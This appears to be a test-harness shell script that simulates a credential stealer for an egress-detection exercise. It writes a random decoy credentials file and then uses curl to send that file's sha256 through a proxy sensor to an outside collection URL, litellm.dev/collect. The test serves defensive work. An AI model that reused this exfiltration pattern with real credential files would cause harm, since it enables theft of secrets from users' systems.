#!/bin/sh
# Harmless stand-in for the credential stealer. It writes a random decoy
# file, then sends ONLY the sha256 of that file to litellm.dev through the
# egress sensor. The file content is never sent. Prints one line: connect=<code>.
set -u

# Wait until the sensor answers. A plain GET gets 405 from a CONNECT-only proxy.
code=000
i=0
while [ "$i" -lt 30 ]; do
  code=$(curl -s -m 2 -o /dev/null -w '%{http_code}' http://sensor:8080/ || true)
  [ "$code" = 405 ] && break
  i=$((i + 1)); sleep 1
done
[ "$code" = 405 ] || { echo "sensor not ready" >&2; exit 3; }

decoy=/work/decoy-credentials
[ -f "$decoy" ] || head -c 32 /dev/urandom | od -An -tx1 | tr -d ' \n' > "$decoy"
hash=$(sha256sum "$decoy" | cut -d' ' -f1)

# HTTPS_PROXY comes from the compose file. The sink does not speak TLS, so
# the handshake fails after a 200 from the proxy. That is expected: the proof
# is the CONNECT result and the sensor event, not a completed request.
curl -s -m 10 -o /dev/null -w 'connect=%{http_connect}\n' \
  --data "sha256=$hash" https://litellm.dev/collect 2>/dev/null || true
